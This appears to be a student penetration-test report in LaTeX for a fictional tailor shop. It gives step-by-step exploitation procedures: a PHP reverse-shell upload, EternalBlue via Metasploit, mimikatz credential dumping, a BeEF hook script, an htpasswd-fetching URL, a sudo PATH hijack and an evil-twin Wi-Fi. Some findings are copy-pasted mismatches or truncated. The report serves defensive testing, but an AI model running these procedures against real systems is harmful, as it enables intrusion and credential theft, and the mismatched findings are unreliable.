@@ -1,0 +1,463 @@
+%  Make this into a pdf document as follows:
+%
+%
+% The edit the Report.tex file appropriately to include only those elements that
+% make sense for the assignment you're reporting on.
+%
+% You can use a tool like TeXShop or Texmaker or some other graphical tool
+% to convert Report.text into a pdf file.
+%
+% If you are making this with command line tools, you'd run the following command:
+%
+%     latex Report.tex
+%
+% That will generate a dvi (device independent) document file called Report.dvi
+% The pages reported in the table of contents won't be correct, since latex only
+% processes one pass over the document. To adjust the page numbers in the contents,
+% run latex again:
+%
+%    latex Report.tex
+%
+% Then run
+%
+%   dvipdf Report.dvi
+%
+% to generate Report.pdf
+%
+% You can view this file to check it out by running
+%
+% xdg-open Report.pdf
+%
+% That's it.
+
+\def\cvss(#1,#2,#3,#4,#5,#6,#7,#8,#9){
+	\indent\textbf{CVSS Base Severity Rating: #9}  AV:#1 AC:#2 PR:#3 UI:#4 S:#5 C:#6 I:#7 A:#8}
+
+\def\ttp(#1, #2, #3, #4, #5, #6){
+	\indent\textbf{#1:} #2 \\
+	\indent\indent\textbf{#3:} #4 \\
+	\indent\indent\indent\textbf{#5:} #6 \\}
+
+\documentclass[notitlepage]{article}
+
+\usepackage{bibunits}
+\usepackage{comment}
+\usepackage{graphicx}
+\usepackage{amsmath}
+\usepackage{datetime}
+\usepackage{numprint}
+\usepackage{hyperref}
+
+% processes above options
+\usepackage{palatino}  %OR newcent ncntrsbk helvet times palatino
+\usepackage{url}
+\usepackage{footmisc}
+\usepackage{endnotes}
+
+\setcounter{secnumdepth}{0}
+\begin{document}
+	
+	\nplpadding{2}
+	\newdateformat{isodate}{
+		\THEYEAR -\numprint{\THEMONTH}-\numprint{\THEDAY}}
+	
+	\title{Art's Tailor Shoppe Penetration Test Report}
+	\author{Jonathan Trost}
+	\date{\isodate\today}
+	
+	\maketitle
+	
+	\tableofcontents
+	
+	\newpage
+	\section{Executive Summary}
+
+	\subsection{Background}
+		\indent \indent Art's Tailor Shoppe hired pr0b3 to perform penetration testing of a new network going up to support the business.  Pr0b3 has been performing regular penetration tests from 7 September to 7 December. Art's Tailor is at IP address 217.70.184.38 with the router being at 217.70.184.3, any service within the router was in scope of testing except for IP address 217.70.184.1, this specific IP address was out of scope. There is a wifi network on the premises that is in scope.  \\
+	\subsection{Overall Posture}
+		\indent \indent The goal of the penetration testing was to empower the client to ensure their system is reasonably secure prior to going live with their new web services. The test successfully found vulnerabilities in many areas of the network.  There are several systemic issues that if address, can raise the security of Art's Tailor, specifically, a process to ensure updates are made to machines in a timely manner so as to limit the number of exploits that can run on them.  There were several instances of custom tools and websites made that allowed remote users to gain user credentials. The loss of credentials was made worse by many passwords being able to be cracked with commonly available software, this allowed us to login into the system as a user and at times, and admin. \\ 
+	
+	\subsection{Risk Ranking}
+	\indent \indent Pr0b3 evaluated the overall risk ranking using the Open Web Application Security Project's, OWASP, risk rating methodology. The determination of a medium likelihood due to several of the vulnerabilities requiring a low skill level in order to exploit. Art's Tailor, being a small business lowers the risk and likelihood of attacks, overall our assessment of \textbf{Likelihood} is \textbf{MEDIUM}.  There are exploits which can be performed remotely, without credentials, that give root access to a machine, so we evaluate an \textbf{impact} as \textbf{HIGH}.  The high impact means that we evaluate an attacker could steal or modify valuable business information that would have a significant impact on the business. The attackers would also be able to make the system unusable.  \\
+	\includegraphics[width=4in]{ex160_1.jpg} \\
+	
+	\subsection{General Findings}
+	\indent \indent The issues with the systems security can be grouped into a few separate categories weak passwords, systems not updated, and custom tools that leave openings for attack.  In several instances, pr0b3 was able to dive deeper into the systems by finding passwords in the file system, found hashed passwords were easy to crack with commonly available software, and the firewall had its default password which makes it trivial for an attacker to gain access.  Several exploits were performed against systems that had not been updated. Two common attacks \textit{Eternal Blue} and \textit{Eternal Red} were able to be used against Art Tailor systems because the latest versions of software had not been installed. \\ 
+	\includegraphics[width=4in]{ex160_pie.jpg} \\
+	
+	
+	\subsection{Recommendation Summary}
+	\indent \indent There are three relatively simple changes that would greatly improve the security of the Art's Tailors online services. \\ 
+	\indent First, increasing the security of passwords used and ensure not default passwords are still active on any system.  If the passwords, can be even a little more complicated, many of our attacks would not have been possible. Second, update system with the latest patches, have a process in place to ensure updates occur in a timely manner. There were several updated system that had well known vulnerabilities with exploits that could easily be used. The third change, would be to not allow the custom tools created by Art's Tailor Personnel, or at least not allow them to be connected to from outside the network. 
+	
+	\subsection{Strategic Roadmap}
+	\indent \indent Art's Tailor Shoppe plans to launch online services in the near future. We recommend that the first three recommendations are acted on prior to commencing of services. The online services should be a great benefit to the business but should ensure they cannot be used to damage the business and its reputation. Overtime, all vulnerabilities should be addressed but the business will gain the biggest benefit from the three recommendations above. As new servers are made or desired to be brought on line for the future of Art's Tailor, we recommend further testing to ensure the risk the business face are as low as possible. 
+	
+	% Include one of these headings for each finding.
+	
+		
+	\subsection{1. Finding: \emph{pFSense Default Admin Credentials}}
+	
+	\subsubsection{Severity Rating}
+	\indent The severity is 10.0. This is a high risk exploit that opens network access to an attacker. 
+	
+	\textbackslash cvss(N,H,N,N,U,H,H,H,10.0)\\
+	\cvss(N,H,N,N,U,H,H,H,10.0) \\
+	
+	\subsubsection{Vulnerability Description}
+	\indent The vulnerability allows an attacker complete control over the router and the rules.  The pfSense default admin credentials are publicly known and anyone can gain control of the router.
+	
+	\subsubsection{Confirmation method}
+	To confirm the exploit use: \\
+	\indent 1. Go to IP address of the router, 217.70.184.3:8443.\\
+	\indent 2. Enter in default pfsense credentials.\\
+	
+	\subsubsection{Mitigation or Resolution Strategy}
+	\indent Change admin credentials on the router.  \\
+	
+		
+	\subsection{2. Finding: \emph{Eternal Red}}
+	
+	\subsubsection{Severity Rating}
+	\indent The severity is 9.8 This is a high risk exploit the allows attackers to remote run code on the attacked machine. 
+	
+	\textbackslash cvss(N,L, N, N, U, H, H, H, 9.8)\\
+	\cvss(N,L, N, N, U, H, H, H, 9.8) \\
+	
+	\subsubsection{Vulnerability Description}
+	\indent Samba since version 3.5.0 and before 4.6.4, 4.5.10 and 4.4.14 is vulnerable to remote code execution vulnerability, allowing a malicious client to upload a shared library to a writable share, and then cause the server to load and execute it.
+	
+	\subsubsection{Confirmation method}
+	To confirm the exploit use: \\
+	\indent 1. Observe that the samba version is 4.5.9. Versions before 4.5.10 are vulnerable. 
+	
+	\subsubsection{Mitigation or Resolution Strategy}
+	\indent Update to the latest Samba Revision.  
+	
+	
+	\subsection{3. Finding: \emph{Able to upload code that can be executed on server through custom site. }}
+	
+	\subsubsection{Severity Rating}
+	\indent The severity is 9.8 as it allows attackers to run software on your server, in our case, we opened a shell and gained access to the file system on the server.  \\
+	
+	\textbackslash cvss(N,L,N,N,U,H,H,H, 9.8)\\
+	\cvss(N,L,N,N,U,H,H,H, 9.8) \\
+	
+	\subsubsection{Vulnerability Description}
+	\indent The website allows users to upload files. We uploaded a reverse shell script that allows us ot open a shell on the server running a php website. The software used was \textbf{laudunam}. \\
+	
+	\subsubsection{Confirmation method}
+	To confirm the exploit use: \\
+	\indent 1. Prepare laudnum php reverse shell script by modifying IP address in code to match your computer's iP address.   \\
+	\indent 2. Start up burp suite software.  Open web browser in burp suite in the \textbf{Proxy} tab and navigate to site.   \\
+	\indent 3. Log onto \textbf{www.artstailor.com/brian} and log into admin section using stolen and cracked credentials using Burp Suite software.  
+	\indent 4. Make a copy of reverse shell script with .png or .jpg at the end.\\
+	\indent 5. In \textbf{proxy} tab of burp suite, turn on intercept. \\
+	\indent 6. Upload shell script with .png or .jpg file.  The uplaod will be intercept.  Navigate to the script and remove the .jpg or .png from the file and then allow the uplaod to continue. \\
+	\indent 7. You can turn off interception now.  You should see the file was successfully uploaded. \\
+	\indent 8. Navigate to \textbf{https://www.artstailor.com/brian/imgfiless} and you'll see the shell script. \\
+	\indent 9. Start apache2 server on your computer. \\
+	\indent 10. Click on the reverse shell script and get it to run.\\
+	\indent 11. A shells should now open on your computer.  \\
+	
+	\subsubsection{Mitigation or Resolution Strategy}
+	\indent 1. First to immediately secure the site, take it down until corrections are made. \\ 
+	\indent 2. MITRE M1037 - Filter network traffic. Only allow access to server form specified machines. \\
+	\indent 3. MITRE M1031 - Network Intrusion Prevention. \\
+	\indent 4. MITRE M1020 - SSL/TLS Inspection, inspect HTTPS traffic.\\
+	\indent 5. MITRE M1038 - Execution Prevention. \\
+	\indent 6. MITRE 1021 - Restrict Web-Based Content. \\
+	
+	
+	\subsection{4. Finding: \emph{Backdoor on File Transfer Server, vsftpd 2.3.4}}
+	
+	\subsubsection{Severity Rating}
+	The severity is 9.8. This is a high risk exploit that opens a shell on the root on the machine.  This exploit would allow the attacker to take data, delete data, and bring down the system or install additional tools.  
+	
+	\textbackslash cvss(N,L,N,N,U,H,H,H,9.8)\\
+	\cvss(N,L,N,N,U,H,H,H,9.8) \\
+	
+	\subsubsection{Vulnerability Description}
+	The vulnerability opens a shell on port 6200/tcp. This allows the user to perform any actions on the system a user could. The attacker could access secure files, delete data, or bring down the system. This vulnerability has a high impact for confidentiality, integrity, and availability of th system and data. 
+	
+	\subsubsection{Confirmation method}
+	To confirm the exploit: \\
+	\indent 1. In command line type \textbf{nmap -sT www.artstailor.com}.\\
+	\indent 2. Under PORT 21, you will see the service \textbf{ftp} with version \textbf{vsftpd 2.3.4}. \\
+	\indent 3. In command line type \textbf{searchsploit vsftpd 2.3.4} \\
+	
+	\subsubsection{Mitigation or Resolution Strategy}
+	Download and use the latest version of vsftpd. The back door and been removed. \\
+	
+		
+	\subsection{5. Finding: \emph{Buffer Overflow Exploit on Custom Service 'Toool'}}
+	
+	\subsubsection{Severity Rating}
+	\indent The severity is 9.8. This is a high risk exploit that opens a shell on the root on the machine.  This exploit would allow the attacker to take data, delete data, and bring down the system or install additional tools.  
+	
+	\textbackslash cvss(N,L,N,N,U,H,H,H,9.8)\\
+	\cvss(N,L,N,N,U,H,H,H,9.8) \\
+	
+	\subsubsection{Vulnerability Description}
+	\indent The vulnerability opens a shell on port 6200/tcp. This allows the user to perform any actions on the system a user could. The attacker could access secure files, delete data, or bring down the system. This vulnerability has a high impact for confidentiality, integrity, and availability of th system and data. 
+	
+	\subsubsection{Confirmation method}
+	To confirm the exploit use: \\
+	\indent 1. Use nmap to inspect PORT 1337 using with flags for TCP.\\
+	\indent 2. Use netcat to establish chat with computer, command is \textbf{nc 217.70.184.38 1337}.  \\
+	\indent 3. With connection open a prompt will come up, enter the username \textbf{brian} and press enter.\\
+	\indent 4. 3 options should be present, \textbf{ip a}, \textbf{ps auxww}, and \textbf{netstat -nat}. \\
+	\indent 5. Now perform the buffer over flow.  Type 29 characters, then type \textbf{\textbackslash bin\textbackslash sh} and press enter. Then type \textbf{\textbackslash bin\textbackslash sh} again. The shell is now open.  \\
+	
+	
+	\subsubsection{Mitigation or Resolution Strategy}
+	\indent Remove service from use. If intending to continue to use service, ensure the second arguments of \textbf{fgets} is small enough to not go beyond the bounds of the 1st arguments memory. \\
+		
+		\subsection{6. Finding: \emph{Escalation of Privileges with Sudo}}
+	
+	\subsubsection{Severity Rating}
+	\indent The severity is 8.8 This is a high risk exploit that opens network access to an attacker. 
+	
+	\textbackslash cvss(N,L, L, N, U, H, H, H, 8.8)\\
+	\cvss(N,L, L, N, U, H, H, H, 8.8) \\
+	
+	\subsubsection{Vulnerability Description}
+	\indent If an attacker gains access to an employee account that does not have root privileges they can potentially gain root privileges.  Pr0b3 inspected the \textbf{sudodoers} file and observed that a.turing has the ability to run /usr/bin/ps with root privileges.  When a.turing calls for commands in command shell, the first file location that is checked is \textbf{/home/a.turing/bin}.  Pr0b3 copied \textbf{bash} into that folder and remained it psreal.  Upon executing th
+	
+	\subsubsection{Confirmation method}
+	To confirm the exploit use: \\
+	\indent 1. Copy bash into a.turing's /bin folder. cp /usr/bin/bash /home/a.turing/bin.
+	\indent 2. Rename the file to psreal. \textbf{cp bash psreal}.
+	\indent 3. Run command \textbf{sudo -u\#-1 /usr/bin/ps} and enter a.turing's password.  
+	\indent 3. You now have a root on devbox.artstailors.com.
+	
+	\subsubsection{Mitigation or Resolution Strategy}
+	\indent \indent 1. Removes a.turings's ability to run \textbf{usr/bin/ps} as root. 
+		
+	
+		
+		\subsection{7. Finding: \emph{Stole Credentials with Internal Network Attack}}
+		
+		\subsubsection{Severity Rating}
+		\indent The severity is 8.8 This is a high risk exploit that opens network access to an attacker. 
+		
+		\textbackslash cvss(L,L, H, N, U, H, H, N, 6.0)\\
+		\cvss(L,L, H, N, U, H, H, N, 6.0) \\
+		
+		\subsubsection{Vulnerability Description}
+		\indent This attack occurs when already inside the network and having root access. The \textit{Responder} software exploited the default configuration of the \textit{Windows Proxy Automatic Detection (WPAD)} system.  The system will then send a request for the user to enter their credentials.  When the user enters the credentials they are obtained by the attacker.  
+		
+		\subsubsection{Confirmation method}
+		To confirm the exploit use: \\
+		\indent 1. Open root access on a Linux computer, in this case, \textbf{devbox.artstailor.com}. \\
+		\indent 2. Ensure you have the Responder Software. \\
+		\indent 3. Ensure WPAD request are available using wireshark or TCPDUMP. \\
+		\indent 4. Use the command \textbf{python Responder.py -I ens33 -wFb}.\\
+		
+		\subsubsection{Mitigation or Resolution Strategy}
+		\indent Disable Windows \textbf{Web Proxy Auto Discovery Protocol (WPAD)}. For the current size of Art's Tailors, configuring employee computers to know the proxy server for access out side the system is possible.\\
+			
+		\subsection{8. Finding: \emph{Eternal Blue CVE-2017-0144}}
+	
+	\subsubsection{Severity Rating}
+	\indent The exploit allows users to gain Domain Admin credentials on the the server. 
+	\textbackslash cvss(N, H, N, N, U, H, H, H, 8.1)\\
+	\cvss(N, H, N, N, U, H, H, H, 8.1) \\
+	
+	\subsubsection{Vulnerability Description}
+	\indent This a remote code execution vulnerability within the Microsoft Server Message Block.  The vulnerability allows attackers to run code on the compromised system.  \\
+	
+	\subsubsection{Confirmation method}
+	To confirm if your system is vulnerability, \\
+	\indent 1. To confirm exploit, you need Kali linux and metasploit.\\
+	\indent 1. Start metaspolit and metaspolit database. \textbf{msfconsole -1} and \textbf{msfdb -init} to start them.\\
+	\indent 2. In metasploit, type \textbf{search eternal blue.}  \\
+	\indent 3. Select "exploit//windows//smb//ms17\_010\_psexece Windows Code Execution" \\
+	\indent 4. Set the RHOST to 10.70.184.89. \\
+	\indent 5. Run exploit by typing \textbf{exploit.}\\
+	\indent 6. The exploit should run and now and give you access to the system. \\
+	\indent 7. To gain the domain admin credentials. Run ps to have all processes listed. Look up 'ServerManager.exe' with the "ARTSTAILOR\\Administrator" and record the PID.\\
+	\indent 8. Use meterpreter command \textbf{migrate (PID)}.\\
+	\indent 9. Type \textbf{getuid} and you will see that you now have administrative privileges.\\ 
+	
+	\subsubsection{Mitigation or Resolution Strategy}
+	\indent The following are recommendations from Microsoft. \\
+	\indent 1. Disable SMBv1 on the affect computer. \\
+	\indent 2. Install update 2919355 from Microsoft, this removes the vulnerability. \\  
+	
+	
+	\subsection{9. Finding: \emph{Weak Password Requirements CWE-521}}
+	
+	\subsubsection{Severity Rating}
+	\indent The severity is 8.1 This is a high risk exploit that opens network access to an attacker. 
+	
+	\textbackslash cvss(N,H,N,N,U,H,H,H,8.1)\\
+	\cvss(N,H,N,N,U,H,H,H,8.1) \\
+	
+	\subsubsection{Vulnerability Description}
+	\indent The vulnerability make it easier for attackers to use easily available methods to crack passwords. 
+	
+	\subsubsection{Confirmation method}
+	To confirm the exploit use: \\
+	\indent 1. Follow instructions ot get \textbf{mimikatz} on windows system.\\
+	\indent 2. Use a admin account to run \textbf{mimikatz}.\\
+	\indent 3. Once running, escalate privileges with the commands \\ \textbf{PRIVILEGE::Debug0} and \textbf{TOKEN::Elevate}.
+	\indent 4. Run the commands \textbf{SEKURLSA::LogonPasswords} and  \textbf{LSADUMP::SAM}.\\
+	\indent 5. Use the user accounts and hashes are dumped and crack them with \textbf{John The Ripper} software meant for cracking hashed passwords.  \\
+	\indent 6. Use the file \textbf{rockyou.txt} that contains common passwors and one password will be cracked. The password that is cracked is owned by the user \textbf{d.darkblood}. The password used by the individual starts with the letter \textbf{D} and ends with the number \textbf{9}.  \\
+	
+	\subsubsection{Mitigation or Resolution Strategy}
+	\indent \indent 1. Implement a minimum password requirement that requires passwords to be 12 characters with at least 1 uppercase letter, lowercase letter, number, and symbol.  \\
+	\indent 2. Password does not include word that can be found in dictionary or the name of a person, product or organization.  \\
+	\indent 3. Training of employees on secure passwords. \\
+	
+	\subsection{10. Finding: \emph{Windows CNG Key Isolation Service Elevation of Privilege Vulnerability CVE-2022-41125}}
+	
+	\subsubsection{Severity Rating}
+	\indent The severity is 7.8 
+	
+	\textbackslash cvss(L,L,L,N,U,H,H,H,7.8)\\
+	\cvss(L,L,L,N,U,H,H,H,7.8) \\
+	
+	\subsubsection{Vulnerability Description}
+	\indent Someone on customers staff has setup the sticky keys exploit to allow them to perform a password reset when convenient. This exploit allows another person with access to the computer to open a command line wiht root privileges.  \\
+	
+	\subsubsection{Confirmation method}
+	To confirm the exploit use: \\
+	\indent 1. Log into books.artstailor.com and type \textbf{\\reset} into the windows search box and press enter.  \\
+	\indent 2. Log out and log back in to computer. \\
+	\indent 3. Press shift fives times.  Once sticky keys window pops up, click on the accessibility button in bottom left. \\
+	\indent 4. A command line should be started with root privileges that does not require logging into the computer. 
+	
+	\subsubsection{Mitigation or Resolution Strategy}
+	\indent Remove the \textbf{reset.bat} file and doe not allow users with admin privileges to perform this exploit. Restrict admin rights to most employees.
+
+	\subsection{11. Finding: \emph{Windows Elevation of Privilege Vulnerability CVE-2021-36934}}
+	
+	\subsubsection{Severity Rating}
+	\indent The severity is 7.8 
+	
+	\textbackslash cvss(L,L,L,N,U,H,H,H,7.8)\\
+	\cvss(L,L,L,N,U,H,H,H,7.8) \\
+	
+	\subsubsection{Vulnerability Description}
+	\indent Allows attacker to run code with SYSTEM privileges.  The attack can install programs, change or delete data, and create new accounts with admin rights. Occures because of permissive Access Control Lists (ACLS) on the Security Accounts Manager (SAM) database. See CVE-2021-36934.\\
+	
+	\subsubsection{Confirmation method}
+	To confirm the exploit use: \\
+	\indent 1. Go to IP address of the router, 217.70.184.3:8443.\\
+	\indent 2. Enter in default pfsense credentials.\\
+	
+	\subsubsection{Mitigation or Resolution Strategy}
+	\indent Restrict access to the contents of \%windir\%\\system32\\config. As an administrator run \textbf{icacls \%windir\%\\system32\\config\\*.* /inheritance:e}.
+	Delete shadow copies following Microsoft's guidance:   	\href{https://support.microsoft.com/en-us/topic/kb5005357-delete-volume-shadow-copies-1ceaa637-aaa3-4b58-a48b-baf72a2fa9e72}{KB5005357 - Delete Volume Shadow Copies} \\
+	
+	
+	\subsection{12. Finding: \emph{Stolen Credentials Using BeEF}}
+	
+	\subsubsection{Severity Rating}
+	\indent The severity is 7.6. The credentials can only be stolen with the participation of a victim. The stealing of credentials could allow a great deal of access depending on the users permissions. 
+	
+	\textbackslash cvss(N,L,N,R,U,H,L,L,7.6)\\
+	\cvss(N,L,N,R,U,H,L,L,7.6) \\
+	
+	\subsubsection{Vulnerability Description}
+	\indent The vulnerability gives attack user credentials for your system.  
+	
+	\subsubsection{Confirmation method}
+	To confirm the exploit use: \\
+	\indent 1. Start up web server, \textbf{apache2} in our case. \textbf{sudo service apache2.}  \\
+	\indent 2. If on linux, create web file, in our case \textbf{collections.html} in \textbf{w/var/www/html/coins/} directory. \\  
+	\indent 3. Paste the following code into the file: \\
+	\indent \indent \textless!DOCTYPE html\textgreater \\
+	\indent \indent \indent \textless html\textgreater \\
+	\indent \indent \indent \indent \textless body \textgreater \\
+	\indent\indent\indent\indent\indent \textless script type="text/javascript" src="\textbf{YOUR IP ADDRESS}:3000/hooks.js" \textgreater \textless /script \textgreater \\
+	\indent\indent\indent\indent \textless /body\textgreater\\
+	\indent\indent\indent \textless /html\textgreater \\
+	\indent 4. Restart \textbf{apache2} server. \textbf{sudo service apache2 restart}. \\
+	\indent 5. Install \textbf{BeEF} per their instructions.\\ \href{https://github.com/beefproject/beef/wiki/Configuration}{BeET Github}.\\
+	\indent 6. Start \textbf{BeEF} per their instructions.\\
+	\indent 7. Open browser and enter 'http://\textbf{YOUR IP ADDRESS} and press enter. \\
+	\indent 8. You should see your IP address in the BeEF software and can run a cookie attack to steal credentials.  \\
+	
+	\subsubsection{Mitigation or Resolution Strategy}
+	\indent 1. User Training on Phishing attacks. \\
+	\indent 2. Configure brower system to regularly delete cookies. \\
+	\indent 3. Use Multi-factor Authentication.\\
+	
+		\subsection{13. Finding: \emph{Credentials Hard coded Into Source Code}}
+	
+	\subsubsection{Severity Rating}
+	\indent The gathering of credentials allows an attack the access to your system your employee has. This does allow some amount of exposure of your data or destruction of it. 
+	\textbackslash cvss(N, L, L, N, U, H, L, L, 7.6)\\
+	\cvss(N, L, L, N, U, H, L, L, 7.6) \\
+	
+	\subsubsection{Vulnerability Description}
+	\indent Application code that was reverse engineer contain credentials for access to MySQL server that can be decoded easily with command line tools. \\
+	
+	\subsubsection{Confirmation method}
+	To confirm the exploit if you have access to the source code. \\
+	\indent 1. Art's Tailor should have source code for the application. Data can be found in android.os.AsyncTask under method with signature "void doInBackground(Void... voidArr).\\
+	To confirm if you do not have access to the source code.\\
+	\indent 1. Start by downloading the \textbf{Jadx Gui} application. It can be used to reverse engineer the software. \\
+	\indent 2. Obtain application .apk file.  Start up \textbf{Jadx} and load the .apk file. \\
+	\indent 3. The source code should now be reverse engineered.  \\
+	\indent 4. Search within the MySQL directories for the phrase 'b64username' and 'b64password.' \\
+	\indent 5. Once you have the codes copy the into text files. For this example the text file is pw.txt. To decode them use the command \textbf{base64 --decodev pw.txt}
+	\indent the username and password should now be available to you. 
+	
+	\subsubsection{Mitigation or Resolution Strategy}
+	\indent 1. To fight against reverse engineering of application, use a code obfuscation application such as \textit{appdome}.  Pr0b3 has not evaluated \textit{appdome} and provides no guarantee that it will prevent the reverse engineer of Art's application. \\
+	\indent 2. If possible, remove hard coded credentials from source code.  If not possible, use recommendation 1, and also rename variables to not use easily understood name like 'username' or 'password.' \\
+	\indent 3. Make use of encryption that hashes the code and obfuscate it within your code logic.  
+	
+	
+		\subsection{14. Finding: \emph{Stole Credentials by modifying url to get htpasswd file}}
+	
+	\subsubsection{Severity Rating}
+	\indent The severity is 7.3. The credentials can be taken at any moment while the site \textbf{www.artstailor.com/brian} is up. The credentials can then be easily cracked using commonly available password crackers, such as \textbf{John The Ripper}.
+	
+	\textbackslash cvss(N,L,N,N,U,L,L,L, 7.3)\\
+	\cvss(N,L,N,N,U,L,L,L,7.3) \\
+	
+	\subsubsection{Vulnerability Description}
+	\indent The website is setup such that visitors of the site can modify the URL in order to send GET, POST, and OPTIONS request to the web server that were not intended to be done.  These can be used to maliciously gain file such as \textbf{htpssword}.  \\
+	
+	\subsubsection{Confirmation method}
+	To confirm the exploit use: \\
+	\indent 1. Log into \textbf{http://www.artstailor.com/brian}.  \\
+	\indent 2. Paste the following URL into the your browser. \textbf{http://www.artstailor.com/brian/getimage.php?raw=true\&file=htpasswd}.\\  
+	\indent 3. You should now see the  hashed credentials. \\
+
+	\subsubsection{Mitigation or Resolution Strategy}
+	\indent 1. Immediate action would be to take down the site until it can be secured. \\
+	\indent 2. MITRE mitigation M1022 - Restrict file and directory permissions. \\
+	
+		
+	\subsection{15. Finding: \emph{Mam In The Middle Credential Harvesting Wifi System}}
+	
+	\subsubsection{Severity Rating}
+	\indent The exploit allows users to gain Domain Admin credentials on the the server. 
+	\textbackslash cvss(L, H, N, R, U, L, L, L, 4.5)\\
+	\cvss(L, H, N, R, U, L, L, L, 4.5) \\
+	
+	\subsubsection{Vulnerability Description}
+	\indent The vulnerability allows one to make a wifi access point that your users will connect to instead of the actual wireless access point.  \\
+	
+	\subsubsection{Confirmation method}
+	To confirm if your system is vulnerability, \\
+	\indent 1. Get software hostapd, and wpa\_supplicant.  .\\
+	\indent 2. In the hostapd configuration file find ssid and set it to artstailor-ddwrt-2. hw\_mode=g and channel to 3.\\
+	\indent 3. Run hostapd with \textbf{sudo ./hostapd-wpe (path to config file)}.\\
+	\indent 4. Use another machine to access our fake wifi access point. \\
+	\indent 5. On the machine running the hostapd, you should see credentials from the transaction. . \\
+	
+	\subsubsection{Mitigation or Resolution Strategy}
+	\indent 1. M1031 Network Intrusion Prevention. \\
+	\indent 2. M1035 Limit Access to Resources over Network. \\  
+	\indent 3. M1030 Network Segmentation. \\
+	
+	
+
+\end{document} 
